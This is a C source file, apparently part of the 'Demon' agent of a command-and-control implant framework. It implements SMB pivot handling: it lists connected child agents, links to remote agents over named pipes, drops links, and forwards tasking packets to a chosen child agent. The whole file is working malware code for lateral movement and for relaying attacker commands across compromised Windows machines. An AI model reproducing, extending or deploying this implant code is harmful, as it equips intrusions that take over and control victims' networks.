/*
 * Command_Pivot.c - SMB pivot command handler
 *
 * DEMON_PIVOT_LIST         : enumerate connected SMB pivot agents
 * DEMON_PIVOT_SMB_CONNECT  : connect to a remote demon via named pipe
 * DEMON_PIVOT_SMB_DISCONNECT : remove a pivot entry and close its pipe
 * DEMON_PIVOT_SMB_COMMAND  : forward a tasking packet to a child pivot agent
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/Parser.h>
#include <core/MiniStd.h>
#include <core/Pivot.h>
#include <core/Win32.h>
#include <commands/Command_Pivot.h>

/* ----------------------------------------------------------------
 * CommandPivot
 *   DataArgs - parser positioned after the CommandID field.
 *              Layout: SubCommand(int32) [, ...sub-command args]
 * ---------------------------------------------------------------- */
VOID CommandPivot( IN PPARSER DataArgs )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_PIVOT );
    DWORD    Pivot   = ParserGetInt32( DataArgs );

    PackageAddInt32( Package, Pivot );

    PRINTF( "Pivot => %d\n", Pivot );

    switch ( Pivot )
    {
        case DEMON_PIVOT_LIST:
        {
            PUTS( "DEMON_PIVOT_LIST" )
            PPIVOT_DATA TempList = Instance->SmbPivots;

            do
            {
                if ( TempList )
                {
                    PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%ls]\n", TempList->DemonID, TempList->PipeName.Buffer )

                    PackageAddInt32( Package, TempList->DemonID );
                    PackageAddWString( Package, TempList->PipeName.Buffer );

                    TempList = TempList->Next;
                } else break;
            }
            while ( TRUE );

            break;
        }

        case DEMON_PIVOT_SMB_CONNECT:
        {
            PUTS( "DEMON_PIVOT_SMB_CONNECT" )

            DWORD  BytesSize = 0;
            PVOID  Output    = NULL;
            BUFFER PipeName  = { 0 };

            PipeName.Buffer = ParserGetBytes( DataArgs, &PipeName.Length );

            if ( PivotAdd( PipeName, &Output, &BytesSize ) )
            {
                PRINTF( "Successful connected: %x : %d\n", Output, BytesSize )

                PackageAddInt32( Package, TRUE );
                PackageAddBytes( Package, Output, BytesSize );

                MemSet( Output, 0, BytesSize );
                Instance->Win32.LocalFree( Output );
                Output = NULL;

#ifdef DEBUG
                PPIVOT_DATA TempList = Instance->SmbPivots;

                PUTS( "Smb Pivots : [ " );
                do {
                    if ( TempList )
                    {
                        PRINTF( "%x\n", TempList->DemonID );
                        TempList = TempList->Next;
                    } else
                        break;
                } while ( TRUE );
                PUTS( "]" );
#endif
            }
            else
            {
                PUTS( "Failed to connect" )
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, NtGetLastError() );
            }

            break;
        }

        case DEMON_PIVOT_SMB_DISCONNECT:
        {
            DWORD AgentID = ParserGetInt32( DataArgs );
            DWORD Success = FALSE;

            Success = PivotRemove( AgentID );

            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, AgentID );

            break;
        }

        case DEMON_PIVOT_SMB_COMMAND:
        {
            PUTS( "DEMON_PIVOT_SMB_COMMAND" )

            UINT32      DemonId   = ParserGetInt32( DataArgs );
            BUFFER      Data      = { 0 };
            PPIVOT_DATA TempList  = Instance->SmbPivots;
            PPIVOT_DATA PivotData = NULL;
            Data.Buffer           = ParserGetBytes( DataArgs, &Data.Length );

            if ( ! Data.Buffer || ! Data.Length )
            {
                PUTS( "Can't send empty data to pivot" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            do
            {
                if ( TempList ) {
                    if ( TempList->DemonID == DemonId ) {
                        PivotData = TempList;
                        break;
                    }
                    TempList = TempList->Next;
                } else break;
            } while ( TRUE );

            if ( PivotData )
            {
                if ( ! PipeWrite( PivotData->Handle, &Data ) )
                {
                    PUTS( "PipeWrite failed" )
                    PACKAGE_ERROR_WIN32
                }
                else
                    PRINTF( "Successfully wrote 0x%x bytes of data to demon %x\n", Data.Length, DemonId )
            } else PRINTF( "Didn't found demon pivot %x\n", DemonId )

            /* DEMON_PIVOT_SMB_COMMAND does not send any response - return early */
            return;
        }

        default: break;
    }

    PUTS( "Pivot transport" )
    PackageTransmit( Package );
}
